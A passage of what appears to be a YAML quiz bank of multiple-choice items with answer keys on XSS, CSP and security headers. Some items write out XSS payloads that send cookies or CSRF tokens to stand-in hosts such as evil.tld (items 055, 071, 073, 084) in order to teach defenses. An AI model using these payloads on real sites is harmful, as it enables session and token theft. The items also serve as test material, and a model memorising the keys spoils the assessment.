  - "It disables geolocation and camera for the page and its embeds, shrinking the abuse surface"
  answer: 3
  explanation: |
    An empty allowlist `feature=()` disables that powerful feature entirely (including
    for self and iframes), so even a compromised page or malicious embed can't silently
    turn it on. It is hardening/defense-in-depth.
  ref: "concepts.md#permissions-policy"

- id: xss-csp-and-security-headers-049
  difficulty: intermediate
  tags: [httponly, cookies]
  question: |
    What does the `HttpOnly` cookie attribute prevent?
  options:
  - "JavaScript from reading the cookie via document.cookie, blocking XSS cookie exfiltration"
  - "The cookie from ever being transmitted over a plaintext HTTP connection to the server"
  - "The cookie from being attached to any cross-site request initiated by a third-party page"
  - "The server from setting or overwriting the cookie value in subsequent HTTP responses"
  answer: 0
  explanation: |
    HttpOnly hides the cookie from document.cookie, so an XSS payload cannot read and
    exfiltrate the session cookie value. (Secure controls HTTPS-only; SameSite controls
    cross-site sending.)
  ref: "concepts.md#httponly-and-the-limits-of-cookie-theft-defense"

- id: xss-csp-and-security-headers-050
  difficulty: advanced
  tags: [httponly, limits]
  question: |
    An interviewer says "our session cookie is HttpOnly, so XSS can't hurt us." What is
    the best rebuttal?
  options:
  - "Correct — HttpOnly fully prevents XSS because injected script can no longer touch the session at all"
  - "HttpOnly stops reading the cookie, but injected script can still make credentialed same-origin requests and act as the user"
  - "HttpOnly only matters for CSRF token protection and has no bearing whatsoever on XSS impact"
  - "HttpOnly makes the cookie readable only over plaintext HTTP, which is inherently the safer channel"
  answer: 1
  explanation: |
    HttpOnly reduces impact (no cookie exfiltration/offline replay) but does not prevent
    XSS: the browser still attaches the cookie to in-page requests, so the attacker rides
    the session (change email, transfer funds) without ever seeing the cookie. The real
    fix is preventing XSS.
  ref: "concepts.md#httponly-and-the-limits-of-cookie-theft-defense"

- id: xss-csp-and-security-headers-051
  difficulty: advanced
  tags: [httponly, localstorage]
  question: |
    Why do some argue against storing bearer tokens in `localStorage`?
  options:
  - "localStorage is hard-capped at 1 KB per origin, far too small to hold a modern signed JWT"
  - "localStorage contents are automatically attached to every outbound request like a cookie is"
  - "localStorage is fully readable by JavaScript, so any XSS can exfiltrate the token, unlike an HttpOnly cookie"
  - "localStorage is encrypted at rest, but the decryption key is stored publicly in the same origin"
  answer: 2
  explanation: |
    Anything in localStorage is JS-accessible, so XSS can read and exfiltrate a stored
    token for offline replay. HttpOnly cookies at least deny the read (though XSS can
    still ride the session in-page).
  ref: "concepts.md#httponly-and-the-limits-of-cookie-theft-defense"

- id: xss-csp-and-security-headers-052
  difficulty: beginner
  tags: [xss-types, comparison]
  question: |
    Which XSS variant never requires the payload to reach the server and can hide in the
    URL fragment?
  options:
  - "Stored XSS"
  - "Reflected XSS"
  - "Server-side XSS"
  - "DOM-based XSS"
  answer: 3
  explanation: |
    DOM-based XSS lives entirely in client JavaScript (source -> sink). Because a payload
    can be placed in the URL fragment, which browsers don't send to the server, it can
    evade server-side inspection.
  ref: "concepts.md#dom-based-xss-source-to-sink"

- id: xss-csp-and-security-headers-053
  difficulty: advanced
  tags: [csp, hardening, scenario]
  question: |
    Which CSP is the strongest modern anti-XSS baseline?
  options:
  - "script-src 'nonce-<random>' 'strict-dynamic'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'"
  - "script-src 'self' 'unsafe-inline' https://cdn.tld; object-src 'self'; default-src 'self'"
  - "default-src *; script-src * 'unsafe-inline'; img-src *; connect-src *; style-src *"
  - "script-src 'unsafe-inline' 'unsafe-eval' data:; object-src *; base-uri *"
  answer: 0
  explanation: |
    A nonce + strict-dynamic policy with object-src 'none' and base-uri 'none' is the
    OWASP/Google-recommended strong baseline: no fragile host allowlist, injected scripts
    are blocked, plugin and <base> vectors are closed. The others rely on unsafe-inline or
    wildcards.
  ref: "concepts.md#strict-dynamic-and-why-allowlist-csp-fails"

- id: xss-csp-and-security-headers-054
  difficulty: advanced
  tags: [csp, base-uri, object-src]
  question: |
    Why are `object-src 'none'` and `base-uri 'none'` recommended in a hardened CSP?
  options:
  - "They enable measurably faster page loads by skipping plugin and base-URL resolution steps"
  - "object-src 'none' kills plugin/Flash vectors and base-uri 'none' stops <base> tag hijacking of relative script URLs"
  - "They are mandatory prerequisites without which the HSTS preload header is silently ignored"
  - "They disable all images and stylesheets on the page, forcing a text-only rendering mode"
  answer: 1
  explanation: |
    object-src 'none' removes legacy plugin execution vectors; base-uri 'none' prevents
    an injected <base> element from rewriting relative script URLs to an attacker origin.
    Both are standard hardening additions.
  ref: "concepts.md#content-security-policy-fundamentals"

- id: xss-csp-and-security-headers-055
  difficulty: expert
  tags: [dom-clobbering, sanitizer-bypass]
  question: |
    A page runs strict, nonce-based CSP and DOMPurify strips all `<script>` tags and `on*`
    event handlers, but allows `<a>` with `id`/`name`. The app later does
    `s = document.createElement('script'); s.src = window.config.url; document.body.append(s)`.
    Which injected payload achieves code execution?
  options:
  - "<img src=x onerror=alert(document.cookie)>"
  - "<a id=config><a id=config name=url href=//evil.tld/x.js>"
  - "<script nonce=guess>alert(document.domain)</script>"
  - "<svg><animate onbegin=alert(document.domain)>"
  answer: 1
  explanation: |
    This is DOM clobbering. Two same-id anchors form a collection and the nested `name=url`
    exposes `window.config.url` as an attacker-controlled value, so the legitimate script
    loader fetches evil.tld/x.js under the page's origin — no injected script needed. The
    onerror/onload/nonce payloads are stripped or blocked by the sanitizer/CSP.
  ref: "concepts.md#dom-clobbering"

- id: xss-csp-and-security-headers-056
  difficulty: advanced
  tags: [dom-clobbering, defense]
  question: |
    Which DOMPurify configuration most directly defeats DOM clobbering attacks?
  options:
  - "ALLOWED_TAGS: ['script']"
  - "RETURN_TRUSTED_TYPE: true"
  - "SANITIZE_NAMED_PROPS: true"
  - "SAFE_FOR_XML: false"
  answer: 2
  explanation: |
    SANITIZE_NAMED_PROPS prefixes attacker-supplied id/name values with `user-content-`, so
    they can no longer collide with real JavaScript properties/globals (window.x, form
    properties). RETURN_TRUSTED_TYPE is for Trusted Types integration, and SAFE_FOR_XML:
    false actually weakens protection.
  ref: "concepts.md#dom-clobbering"

- id: xss-csp-and-security-headers-057
  difficulty: expert
  tags: [dom-clobbering, filter-bypass]
  question: |
    A sanitizer iterates `for (const a of node.attributes) { ... }` to inspect each
    attribute. How can an attacker inject markup that breaks this loop to slip past the
    filter?
  options:
  - "Inject <form><input id=attributes> so form.attributes is clobbered and no longer a NamedNodeMap"
  - "Inject an attribute value several megabytes long so the loop exhausts the tab's heap and crashes"
  - "Inject a leading Unicode BOM (U+FEFF) so the parser silently drops the element's first attribute"
  - "Inject an attribute name containing a NUL byte so the for-of loop terminates early at that entry"
  answer: 0
  explanation: |
    Clobbering the `attributes` property (via a named form control with id=attributes)
    replaces the expected NamedNodeMap with an element reference, so the iteration throws or
    misbehaves and the filter loop is defeated. The defense is verifying
    `node.attributes instanceof NamedNodeMap` before trusting it.
  ref: "concepts.md#dom-clobbering"

- id: xss-csp-and-security-headers-058
  difficulty: expert
  tags: [mxss, parser]
  question: |
    What is the root cause that makes mutation XSS (mXSS) possible against an otherwise
    correct HTML sanitizer?
  options:
  - "The browser HTML parser is not idempotent: re-serializing and re-parsing sanitizer-approved markup can mutate it into executable markup"
  - "The sanitizer runs on the server during SSR instead of in the browser, so it misses client-only mutations"
  - "The sanitizer relies on a blocklist of banned tags instead of a strict element/attribute allowlist"
  - "TLS session renegotiation silently corrupts a few bytes of the sanitized string while it is in transit"
  answer: 0
  explanation: |
    mXSS arises because assigning to innerHTML parses markup, and later re-serialization/
    normalization/reinsertion can transform sanitizer-approved nodes into a different,
    executable shape. The sanitizer inspected the pre-mutation form. This is why sanitizer
    output must never be re-serialized or post-processed.
  ref: "concepts.md#mutation-xss-mxss-internals"

- id: xss-csp-and-security-headers-059
  difficulty: expert
  tags: [mxss, namespace-confusion]
  question: |
    Which markup construct is a classic mXSS engine because it switches the parser between
    HTML and foreign-content parsing rules?
  options:
  - "<div class=\"svg\">...</div>, a plain HTML block whose class name has no effect on parsing rules"
  - "<p data-svg=\"1\">...</p>, an ordinary paragraph with a custom data attribute the parser ignores"
  - "<annotation-xml encoding=\"text/html\"> inside <math>, or <style> inside <svg>"
  - "<span style=\"color:red\">...</span>, an inline element styled with CSS that stays in the HTML namespace"
  answer: 2
  explanation: |
    SVG/MathML integration points (e.g. <svg><style>, <math><mtext>, and
    <annotation-xml encoding="text/html">) parse content under different rules than HTML.
    Re-serialization can move content across the namespace boundary so inert text becomes
    live HTML — the core of modern DOMPurify mXSS bypasses (Mizu 2024).
  ref: "concepts.md#mutation-xss-mxss-internals"

- id: xss-csp-and-security-headers-060
  difficulty: advanced
  tags: [mxss, sanitizer-hygiene]
  question: |
    Your code does `el.innerHTML = DOMPurify.sanitize(input).replace(/foo/g, 'bar')`.
    Why is this dangerous?
  options:
  - "String.replace with a global regex is too slow to run on large sanitized HTML in a hot render path"
  - "DOMPurify.sanitize actually returns a Promise, so chaining .replace on it operates on [object Promise]"
  - "innerHTML always double-encodes HTML entities, so the replaced text renders with visible &amp; sequences"
  - "Modifying the HTML after sanitizing can void the sanitization and re-open a mutation the sanitizer had neutralized"
  answer: 3
  explanation: |
    Post-processing sanitizer output breaks its guarantee: the string edit can reintroduce a
    parse mutation DOMPurify had removed. Sanitize once and assign the result directly to the
    sink (ideally as TrustedHTML) with no further modification.
  ref: "concepts.md#mutation-xss-mxss-internals"

- id: xss-csp-and-security-headers-061
  difficulty: expert
  tags: [dompurify, trusted-types, config]
  question: |
    You set `DOMPurify.sanitize(x, { RETURN_TRUSTED_TYPE: true })` on a page enforcing
    `require-trusted-types-for 'script'`. The call throws a Trusted Types policy error.
    What is the most likely fix?
  options:
  - "Add `dompurify` to the CSP `trusted-types` directive so DOMPurify's auto-created policy is allowed"
  - "Remove require-trusted-types-for 'script' from the CSP entirely so the sink stops rejecting values"
  - "Switch RETURN_TRUSTED_TYPE to false and assign the returned raw string straight to innerHTML instead"
  - "Set ALLOWED_TAGS to an empty array so DOMPurify produces text-only output that needs no policy"
  answer: 0
  explanation: |
    With RETURN_TRUSTED_TYPE, DOMPurify creates a Trusted Types policy named `dompurify`.
    Trusted Types only permits policy names listed in the CSP `trusted-types` directive, so
    it must include `dompurify`. Disabling Trusted Types or returning a raw string would
    remove the protection you wanted.
  ref: "concepts.md#configuring-an-html-sanitizer-dompurify"

- id: xss-csp-and-security-headers-062
  difficulty: advanced
  tags: [dompurify, server-side, config]
  question: |
    A team runs DOMPurify server-side for SSR. Which choice is UNSAFE for sanitization?
  options:
  - "Using jsdom and keeping it pinned and patched"
  - "Applying a tight ALLOWED_TAGS/ALLOWED_ATTR allowlist"
  - "Using SANITIZE_NAMED_PROPS to mitigate clobbering"
  - "Using happy-dom as the DOM implementation for DOMPurify"
  answer: 3
  explanation: |
    happy-dom is not a safe DOM backend for DOMPurify sanitization and has known gaps; a
    patched jsdom (or a real browser build) is the supported path. The other options are
    correct hardening choices.
  ref: "concepts.md#configuring-an-html-sanitizer-dompurify"

- id: xss-csp-and-security-headers-063
  difficulty: advanced
  tags: [dompurify, use-profiles, pitfall]
  question: |
    A developer sets both `ALLOWED_TAGS: ['b','i','a']` and `USE_PROFILES: { html: true }`
    on the same DOMPurify call and is surprised many more tags are allowed than expected.
    Why?
  options:
  - "Enabling USE_PROFILES overrides ALLOWED_TAGS, so the profile's broader tag set applies"
  - "USE_PROFILES is silently ignored whenever an explicit ALLOWED_TAGS array is also supplied on the call"
  - "ALLOWED_TAGS only constrains which attributes survive, never which element tags are kept in the output"
  - "The two options are strictly additive, so the intersection of both allowlists is the final tag set"
  answer: 0
  explanation: |
    USE_PROFILES overrides ALLOWED_TAGS — the profile's built-in tag list wins. To restrict
    to a small custom set, use ALLOWED_TAGS/ALLOWED_ATTR without USE_PROFILES.
  ref: "concepts.md#configuring-an-html-sanitizer-dompurify"

- id: xss-csp-and-security-headers-064
  difficulty: expert
  tags: [coop, coep, cross-origin-isolation]
  question: |
    A page needs `SharedArrayBuffer` and high-resolution `performance.now()`, both locked
    down after Spectre. Which header combination re-enables them by achieving cross-origin
    isolation?
  options:
  - "Strict-Transport-Security + X-Content-Type-Options: nosniff"
  - "Cross-Origin-Opener-Policy: same-origin AND Cross-Origin-Embedder-Policy: require-corp"
  - "Content-Security-Policy: sandbox + Referrer-Policy: no-referrer"
  - "X-Frame-Options: DENY + Permissions-Policy: fullscreen=()"
  answer: 1
  explanation: |
    COOP: same-origin plus COEP: require-corp make self.crossOriginIsolated true, which
    re-enables SharedArrayBuffer, unthrottled performance.now(), and
    measureUserAgentSpecificMemory(). The other headers don't grant cross-origin isolation.
  ref: "concepts.md#cross-origin-isolation-coop-coep-and-corp"

- id: xss-csp-and-security-headers-065
  difficulty: advanced
  tags: [coop, tabnabbing]
  question: |
    What is the primary security effect of `Cross-Origin-Opener-Policy: same-origin`?
  options:
  - "It encrypts the document's cookies at rest in the browser store so cross-origin scripts cannot read them"
  - "It forces every subresource the document loads to be fetched over an HTTPS connection, upgrading http:// URLs"
  - "It severs window.opener so cross-origin pages you open (or that opened you) cannot script your window, closing reverse-tabnabbing and many XS-Leaks"
  - "It blocks the page from being placed in an iframe by any cross-origin parent, the way frame-ancestors does"
  answer: 2
  explanation: |
    COOP: same-origin isolates the browsing-context group and breaks the window.opener
    relationship across origins, defeating reverse tabnabbing and cross-window leak/scripting
    paths. Framing is controlled by frame-ancestors, not COOP.
  ref: "concepts.md#cross-origin-isolation-coop-coep-and-corp"

- id: xss-csp-and-security-headers-066
  difficulty: advanced
  tags: [corp, xssi]
  question: |
    What does `Cross-Origin-Resource-Policy: same-origin` on a response accomplish?
  options:
  - "It allows any cross-origin document on the web to embed and load the resource without restriction"
  - "It automatically rewrites the Set-Cookie on the resource to add the SameSite=Strict attribute for the client"
  - "It tells the browser only same-origin documents may embed/load this resource, mitigating XSSI and side-channel leaks"
  - "It upgrades the resource request from http:// to https:// before the browser dispatches the fetch"
  answer: 2
  explanation: |
    CORP is a per-resource opt-in declaring who may embed it. `same-origin` blocks other
    sites from loading the resource into <img>/<script>/etc., reducing cross-site inclusion
    (XSSI) and Spectre-style read side channels.
  ref: "concepts.md#cross-origin-isolation-coop-coep-and-corp"

- id: xss-csp-and-security-headers-067
  difficulty: expert
  tags: [csp, unsafe-hashes]
  question: |
    Under a strict CSP you must keep one legacy inline `onclick="doThing()"` handler that
    cannot be refactored right now. Which is the correct least-bad approach?
  options:
  - "Add 'unsafe-inline' to script-src so the one legacy onclick handler is permitted alongside the nonce"
  - "Add 'unsafe-hashes' with the SHA-256 hash of the handler body to script-src"
  - "Add 'unsafe-eval' to script-src so the inline onclick expression is allowed to compile and run"
  - "Add the page's own origin ('self') to script-src so the same-origin inline handler is trusted"
  answer: 1
  explanation: |
    'unsafe-hashes' allows specific inline event-handler/style attributes to run by hash
    without enabling all inline script — far narrower than 'unsafe-inline'. It is weaker than
    removing the handler (the right long-term fix), but it does not blanket-allow inline
    script the way 'unsafe-inline'/'unsafe-eval' would.
  ref: "concepts.md#advanced-csp-source-expressions"

- id: xss-csp-and-security-headers-068
  difficulty: expert
  tags: [csp, script-src-attr]
  question: |
    You allow nonced `<script>` elements but want to guarantee NO inline event-handler
    attributes (`onclick=`, `onload=`) ever execute, regardless of script-src. Which
    directive expresses this?
  options:
  - "script-src-attr 'none'"
  - "script-src-elem 'none'"
  - "object-src 'none'"
  - "default-src 'self'"
  answer: 0
  explanation: |
    script-src-attr governs inline event-handler attributes specifically; setting it to
    'none' blocks all inline handlers independent of script-src. script-src-elem governs
    <script> elements (which you still want to allow via nonce).
  ref: "concepts.md#advanced-csp-source-expressions"

- id: xss-csp-and-security-headers-069
  difficulty: advanced
  tags: [csp, script-src-elem-attr]
  question: |
    What is the difference between `script-src-elem` and `script-src-attr`?
  options:
  - "-elem governs <script> elements (inline blocks and src loads); -attr governs inline event-handler attributes"
  - "-elem governs scripts fetched over plain HTTP, while -attr governs those fetched over an HTTPS connection"
  - "-elem restricts the sources of stylesheets and CSS, while -attr restricts the sources of JavaScript files"
  - "They are exact aliases with identical behavior, kept only for backward compatibility with CSP Level 2"
  answer: 0
  explanation: |
    script-src-elem controls <script> elements; script-src-attr controls inline on* handler
    attributes. When unset they fall back to script-src, then default-src. This granularity
    lets you permit nonced script elements while banning inline handlers.
  ref: "concepts.md#advanced-csp-source-expressions"

- id: xss-csp-and-security-headers-070
  difficulty: expert
  tags: [csp, script-gadgets]
  question: |
    A CSP uses `'nonce-...' 'strict-dynamic'` and scores highly in CSP Evaluator, yet an
    attacker who can inject non-script HTML still runs code. Which mechanism most likely
    explains this?
  options:
  - "The nonce value was too long, so the browser truncated it and matched any inline script by prefix"
  - "'strict-dynamic' disables the nonce check entirely, allowing every inline and external script to run"
  - "The browser ignored the CSP because it was delivered in a <meta http-equiv> tag rather than a header"
  - "A script gadget in an already-trusted bundle (e.g. an AngularJS {{ }} expression or a JSONP callback) turns injected benign markup into execution"
  answer: 3
  explanation: |
    strict-dynamic trusts scripts loaded by trusted code, but if a trusted bundle contains a
    script gadget (AngularJS template evaluation, a JSONP callback, framework auto-init), the
    attacker's injected HTML supplies data the gadget executes — no injected <script> needed.
    Gadget-auditing trusted bundles is required even under strict-dynamic.
  ref: "concepts.md#csp-bypasses-dangling-markup-policy-injection-and-script-gadgets"

- id: xss-csp-and-security-headers-071
  difficulty: expert
  tags: [csp, dangling-markup, exfiltration]
  question: |
    CSP blocks all script execution, but `img-src` and `connect-src` allow arbitrary hosts.
    An attacker injects `<img src='//evil.tld/log?` (unterminated) before a page region
    containing a CSRF token. What happens?
  options:
  - "The CSP blocks the injection entirely because img-src is governed by the same script-src restriction"
  - "Nothing happens — img-src only controls which images render and has no bearing on data exfiltration"
  - "The browser treats the following page markup (including the CSRF token) as the attribute value and sends it to evil.tld when it fetches the image"
  - "The token is automatically HTML-entity encoded on output, so the unterminated attribute stays inert"
  answer: 2
  explanation: |
    This is dangling-markup injection: the unterminated attribute swallows subsequent page
    content (the token) up to the next matching quote, and the browser exfiltrates it in the
    image request URL. CSP script blocking doesn't stop it; img-src 'self' helps but the real
    fix is fixing the HTML injection.
  ref: "concepts.md#csp-bypasses-dangling-markup-policy-injection-and-script-gadgets"

- id: xss-csp-and-security-headers-072
  difficulty: expert
  tags: [csp, policy-injection]
  question: |
    An app reflects a user-supplied value into the `Content-Security-Policy` header it
    emits. How can an attacker abuse this "CSP policy injection"?
  options:
  - "By padding the reflected value past 8 KB so the oversized header is dropped and no policy is enforced"
  - "By appending a directive such as `; script-src-elem 'unsafe-inline'` that overrides the intended base script-src and re-enables inline script"
  - "By reflecting a value that renames the response header to X-CSP, which browsers honor more permissively"
  - "It cannot be abused, because the browser treats CSP response headers as read-only and immutable to input"
  answer: 1
  explanation: |
    If untrusted input lands in the CSP header, the attacker can inject a directive that
    overrides the intended policy (e.g. a permissive script-src-elem), neutralizing
    protection. Never construct CSP from untrusted input.
  ref: "concepts.md#csp-bypasses-dangling-markup-policy-injection-and-script-gadgets"

- id: xss-csp-and-security-headers-073
  difficulty: expert
  tags: [csp, base-uri, dom-clobbering]
  question: |
    A strict CSP uses nonces but references its scripts relatively, e.g.
    `<script nonce=abc src="app.js">`, and omits `base-uri`. Why is this exploitable?
  options:
  - "Relative script URLs are always rejected by CSP's script-src directive unless an absolute origin is also explicitly listed"
  - "An injected `<base href='//evil.tld/'>` rewrites the relative script URL, so the nonced script loads from the attacker's origin"
  - "The CSP nonce attribute is silently ignored by the browser whenever a script's src is a relative rather than an absolute URL"
  - "The browser refuses to fetch app.js at all unless its src attribute specifies a fully-qualified absolute https:// URL"
  answer: 1
  explanation: |
    Without base-uri 'none', an injected <base> element changes the base for relative URLs,
    so the nonced <script src="app.js"> resolves to evil.tld/app.js and loads attacker code
    with the page's trust. base-uri 'none' is a required hardening directive precisely for
    this.
  ref: "concepts.md#csp-bypasses-dangling-markup-policy-injection-and-script-gadgets"

- id: xss-csp-and-security-headers-074
  difficulty: advanced
  tags: [csp, sandbox]
  question: |
    You must serve untrusted user-uploaded HTML with minimal capability. What does an empty
    `Content-Security-Policy: sandbox` (no tokens) do?
  options:
  - "It turns off all Content-Security-Policy enforcement for that response, since an empty directive is treated as an opt-out signal"
  - "It runs the document as an opaque unique origin with scripts, forms, popups, and same-origin access all disabled (maximum restriction)"
  - "It permits inline and external scripts to run normally but blocks the document from loading any images, fonts, or stylesheets"
  - "It only affects child iframes that embed the document from another origin, leaving the top-level document itself entirely unrestricted"
  answer: 1
  explanation: |
    The CSP sandbox directive applies iframe-style sandboxing to the response itself; with no
    tokens it is maximally restrictive (opaque origin, no scripts/forms/popups/same-origin).
    You add back capabilities with tokens like allow-scripts, allow-forms as needed — but
    avoid allow-scripts + allow-same-origin together for untrusted content.
  ref: "concepts.md#sandbox-upgrade-insecure-requests-and-mixed-content"

- id: xss-csp-and-security-headers-075
  difficulty: advanced
  tags: [csp, upgrade-insecure-requests, hsts]
  question: |
    Which statement about `upgrade-insecure-requests` is correct?
  options:
  - "It is a complete drop-in replacement for HSTS that also provides first-request downgrade protection on the very first visit"
  - "It downgrades https:// requests back to http:// for the static asset paths to save the TLS handshake cost and improve latency"
  - "It applies exclusively to WebSocket (ws:// and wss://) connections and has no effect on ordinary image, script, or stylesheet fetches"
  - "It auto-upgrades http subresource/same-origin nav URLs to https, but does not upgrade cross-origin top-level navigations and is not a substitute for HSTS"
  answer: 3
  explanation: |
    upgrade-insecure-requests rewrites http:// subresource and same-origin navigation URLs to
    https:// to fix mixed content, but it doesn't upgrade cross-origin top-level navigations
    and provides no first-request MITM protection — HSTS (ideally preloaded) is still
    required.
  ref: "concepts.md#sandbox-upgrade-insecure-requests-and-mixed-content"

- id: xss-csp-and-security-headers-076
  difficulty: advanced
  tags: [reporting-api, headers]
  question: |
    In the modern Reporting API v1, how do you direct CSP violation reports to an endpoint?
  options:
  - "Set a legacy `Report-To` response header defining the endpoints and reference that group from the CSP `report-uri` directive"
  - "Set a `Reporting-Endpoints` header and reference the named group with the CSP `report-to` directive"
  - "Set a single `X-Report` response header holding the endpoint URL, which the browser reads directly without any CSP directive"
  - "Reports are POSTed automatically to a fixed `/.well-known/csp-report` path at the origin root, and no header configuration is possible"
  answer: 1
  explanation: |
    Reporting API v1 uses the `Reporting-Endpoints` response header defining named endpoints,
    referenced from CSP via the `report-to <group>` directive. `Report-To` is the older name
    it supersedes; `report-uri` is deprecated but often sent alongside for compatibility.
  ref: "concepts.md#modern-reporting-api-reporting-endpoints-and-nel"

- id: xss-csp-and-security-headers-077
  difficulty: advanced
  tags: [csp, report-sample]
  question: |
    What does the `'report-sample'` keyword in a CSP source list do?
  options:
  - "It configures the browser to statistically sample and forward only about 1% of violation events to reduce total report volume"
  - "It suppresses reporting entirely for any request the browser has randomly selected into its sampled subset of traffic"
  - "It restricts the browser to sending violation reports only for same-origin resources, discarding all cross-origin violations"
  - "It tells the browser to include a short snippet of the offending inline script in the violation report to aid triage"
  answer: 3
  explanation: |
    'report-sample' asks the browser to add a small sample of the blocked inline
    script/handler content to the violation report, which helps developers identify what was
    blocked. It is not about statistical sampling of report volume.
  ref: "concepts.md#modern-reporting-api-reporting-endpoints-and-nel"

- id: xss-csp-and-security-headers-078
  difficulty: expert
  tags: [js-context, script-breakout]
  question: |
    Untrusted data is placed inside `<script>var name='DATA';</script>` and the developer
    backslash-escapes quotes in DATA. Why can this still be XSS?
  options:
  - "Backslash escape sequences inside string literals are stripped out by the JavaScript engine at parse time, so the escaping has no runtime effect"
  - "The HTML parser acts before the JS lexer, so a literal </script> inside DATA closes the script element; you must also encode < > &, or emit via JSON.parse/data attribute"
  - "The var declaration is hoisted to the top of the enclosing scope, which re-exposes the raw unescaped value to any injected code before assignment"
  - "Single quotes are not valid string delimiters in JavaScript, so the surrounding quotes are ignored and the value is evaluated as a bare expression"
  answer: 1
  explanation: |
    Escaping quotes alone is insufficient: HTML parsing precedes JS lexing, so a </script>
    sequence in the value terminates the script block regardless of JS escaping. Encode
    <, >, & (e.g. <) or, better, emit the value as JSON and JSON.parse it, or pass it via
    a data-* attribute.
  ref: "concepts.md#javascript-and-json-context-escaping"

- id: xss-csp-and-security-headers-079
  difficulty: expert
  tags: [json-in-html, escaping]
  question: |
    When embedding a JSON blob inside an HTML `<script>` element, which characters must be
    escaped (e.g. as \u00XX) to be safe across both the HTML parser and the JS string
    grammar?
  options:
  - "Only the double-quote character, since it is the sole delimiter that could prematurely terminate the surrounding JSON string value"
  - "< > & and the line terminators U+2028 / U+2029"
  - "Only the backslash character, because it is the JSON escape introducer and everything else passes through both grammars unchanged"
  - "Only ordinary whitespace characters such as spaces, tabs, and newlines, which must be collapsed to keep the embedded blob compact"
  answer: 1
  explanation: |
    < enables </script> breakout in the HTML parser; > and & are encoded for safety; and
    U+2028/U+2029 are valid in JSON but historically illegal in JS string literals (breaking
    older parsers). Encoding these keeps the embedded JSON safe in both grammars.
  ref: "concepts.md#javascript-and-json-context-escaping"

- id: xss-csp-and-security-headers-080
  difficulty: advanced
  tags: [xssi, json-hijacking]
  question: |
    Why do some APIs prefix JSON responses with `)]}',\n` or `while(1);`?
  options:
  - "To compress the response body by signaling a custom gzip-like framing that the client decompresses before parsing the JSON"
  - "To encode the API's schema version in a machine-readable prefix so clients can branch on it before deserializing the payload"
  - "To satisfy a mandatory CORS preflight requirement that rejects any JSON body not opening with a recognized safety token"
  - "As an anti-XSSI/JSON-hijacking guard so the body cannot be executed as a <script>; legitimate clients strip the prefix, and it pairs with nosniff + correct Content-Type"
  answer: 3
  explanation: |
    The prefix makes the response non-executable if included cross-origin via <script>
    (defeating JSON hijacking of top-level arrays). Clients strip it before parsing. It works
    alongside X-Content-Type-Options: nosniff and a correct JSON Content-Type.
  ref: "concepts.md#javascript-and-json-context-escaping"

- id: xss-csp-and-security-headers-081
  difficulty: expert
  tags: [nonce, caching, cdn]
  question: |
    A team puts a nonce-based CSP on pages that are fully cached at the CDN and served
    identically to all users. Why does this destroy the nonce's protection, and what is the
    right fix?
  options:
  - "It doesn't destroy anything; a nonce cached and served identically to every user remains perfectly secure as long as it stays cryptographically random"
  - "Nonces are fundamentally incompatible with any caching layer, so the page will fail to render at all — the only fix is to switch to 'unsafe-inline'"
  - "The cached nonce is now static/public so an attacker reads and reuses it — use hash-based CSP for static pages or inject a fresh nonce per request at the edge"
  - "CDNs routinely strip the Content-Security-Policy response header from cached responses, so the policy must instead be delivered via a <meta http-equiv> tag"
  answer: 2
  explanation: |
    A nonce must be fresh and unpredictable per response; a cached page freezes it, so it is
    readable and reusable by an attacker and provides no protection. For cacheable/static
    pages use hash-based CSP (pins exact bytes) or generate the nonce per request at the edge
    and rewrite header + tags.
  ref: "concepts.md#nonces-caching-and-cdn-interaction"

- id: xss-csp-and-security-headers-082
  difficulty: advanced
  tags: [nonce, middleware, pitfall]
  question: |
    Why is middleware that automatically stamps the CSP nonce onto EVERY `<script>` tag in
    the rendered output dangerous?
  options:
  - "It measurably slows down server-side rendering because stamping the attribute requires a second full parse of the emitted HTML output"
  - "The CSP specification forbids a single nonce value from appearing on more than one <script> tag, so the duplicated nonce invalidates the policy"
  - "It would also add the nonce to scripts built from user data, re-blessing an injected script and defeating the policy"
  - "It forces every stamped script to load and execute synchronously, blocking the parser and eliminating async/defer performance benefits"
  answer: 2
  explanation: |
    Blindly noncing all script tags means an injected/attacker-influenced <script> also gets
    a valid nonce and executes. Nonces must be applied only to known-trusted, server-authored
    tags — never to markup derived from untrusted input.
  ref: "concepts.md#nonces-caching-and-cdn-interaction"

- id: xss-csp-and-security-headers-083
  difficulty: advanced
  tags: [self-xss, social-engineering]
  question: |
    Why can output encoding NOT fix "self-XSS" where a user is tricked into pasting attacker
    JavaScript into their browser DevTools console?
  options:
  - "Because the DevTools console transparently encrypts any pasted input, so the server-side encoding routines can never see or transform the payload"
  - "Because output encoding is applied exclusively on the server during response generation and cannot reach code that runs entirely in the browser"
  - "Because opening the DevTools console automatically suspends Content-Security-Policy enforcement for the tab, letting the pasted script run freely"
  - "Because there is no injection point in the application — it is social engineering; defenses are user education, console warnings, and UX, not encoding"
  answer: 3
  explanation: |
    Self-XSS has no application injection vector; the user runs the code themselves in their
    own session. Encoding/CSP can't intercept a manual console paste. Mitigations are browser
    console warnings, user education, and avoiding 'paste this code' affordances.
  ref: "concepts.md#self-xss-javascriptdata-urls-and-reverse-tabnabbing"

- id: xss-csp-and-security-headers-084
  difficulty: advanced
  tags: [url-scheme, javascript-url]
  question: |
    A React app renders `<a href={userUrl}>`. An attacker sets userUrl to
    `javascript:fetch('//evil?'+document.cookie)`. What is the correct fix?
  options:
  - "Rely on React's auto-escaping, which strips the javascript: scheme from any href value before it is rendered into the anchor"
  - "HTML-entity encode the URL string before rendering it, so the colon and other characters in javascript: become inert entities"
  - "Scheme-allowlist the URL: permit only http/https/mailto/relative and reject others before assigning it to href"
  - "Add rel=\"noopener noreferrer\" to the anchor so the opened page cannot script back through window.opener with the URL"
  answer: 2
  explanation: |
    React's text auto-escaping does not neutralize a javascript: URL in an href/src; the fix
    is validating the scheme against an allowlist (https/http/mailto/relative) and rejecting
    javascript:/data: before rendering. rel=noopener addresses tabnabbing, not this.
  ref: "concepts.md#self-xss-javascriptdata-urls-and-reverse-tabnabbing"

- id: xss-csp-and-security-headers-085
  difficulty: intermediate
  tags: [tabnabbing, target-blank]
  question: |
    A link opens with `target="_blank"`. What attribute prevents the opened page from using
    `window.opener` to redirect the original tab (reverse tabnabbing)?
  options:
  - "rel=\"noopener noreferrer\""
  - "download"
  - "referrerpolicy=\"unsafe-url\""
  - "loading=\"lazy\""
  answer: 0
  explanation: |
    rel="noopener" nulls window.opener in the opened page, and noreferrer also strips the
    Referer; together they block reverse tabnabbing. Modern browsers imply noopener for
    target=_blank, but setting it explicitly (or COOP: same-origin at the document level) is
    best practice.
